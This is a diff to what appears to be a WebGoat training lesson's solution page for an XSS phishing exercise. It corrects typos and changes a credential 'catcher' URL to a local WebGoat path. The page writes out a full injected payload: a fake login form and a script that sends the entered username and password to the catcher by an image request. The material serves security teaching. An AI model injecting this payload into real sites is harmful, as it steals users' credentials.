@@ -18,17 +18,17 @@ hard for a victim to determinate that the content is malicious.
 <p><b>General Goal(s):</b><br/>
 The user should be able to add a form asking for username 
 and password. On submit the input should be sent to 
-http://localhostcatcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
+http://localhost/webgoat/catcher?PROPERTY=yes&user=catchedUserName&password=catchedPasswordName
 </p>
 
 <b>Solution:</b><br/>
-With XSS it is possible to add further elements to an exsisting Page.
+With XSS it is possible to add further elements to an existing Page.
 This solution consists of two parts you have to combine:
 <ul>
 <li>A form the victim has to fill in</li>
 <li>A script which reads the form and sends the gathered information to the attacker</li>
 </ul>
-A Form whith username and password could look like this:<br/>
+A Form with username and password could look like this:<br/>
 <p>
 &lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
 &gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot;
@@ -40,19 +40,19 @@ Now you need a script:
 <p>
 &lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials were just stolen."
 User Name = &quot; + document.forms[0].user.value + &quot;Password = &quot; +  document.forms[0].pass.value); 
-XSSImage=new Image; XSSImage.src=&quot;http://localhostcatcher?PROPERTY=yes&amp;user=&quot;+
+XSSImage=new Image; XSSImage.src=&quot;http://localhost/webgoat/catcher?PROPERTY=yes&amp;user=&quot;+
 document.forms[0].user.value + &quot;&amp;password=&quot; + document.forms[0].pass.value + &quot;&quot;;}
 &lt;/script&gt;
 </p>
 <p>
 This script will read the input from the form and send it to the catcher of WebGoat.<br/><br/>
 The last step is to put things together. Add a Button to the form which
-calls the script. You can reach this wicht the onclick="myFunction" handler.
+calls the script. You can reach this with the onclick="myFunction" handler.
 <p>
 The final String looks like this:<br/>
 &lt;script&gt;function hack(){ alert(&quot;Had this been a real attack... Your credentials were just stolen.
 User Name = &quot; + document.forms[0].user.value + &quot;Password = &quot; +  document.forms[0].pass.value); 
-XSSImage=new Image; XSSImage.src=&quot;http://localhostcatcher?PROPERTY=yes&amp;user=&quot;+
+XSSImage=new Image; XSSImage.src=&quot;http://localhost/webgoat/catcher?PROPERTY=yes&amp;user=&quot;+
 document.forms[0].user.value + &quot;&amp;password=&quot; + document.forms[0].pass.value + &quot;&quot;;}
 &lt;/script&gt;&lt;form&gt;&lt;br&gt;&lt;br&gt;&lt;HR&gt;&lt;H3&gt;This feature requires account login:&lt;/H3
 &gt;&lt;br&gt;&lt;br&gt;Enter Username:&lt;br&gt;&lt;input type=&quot;text&quot; id=&quot;user&quot; 
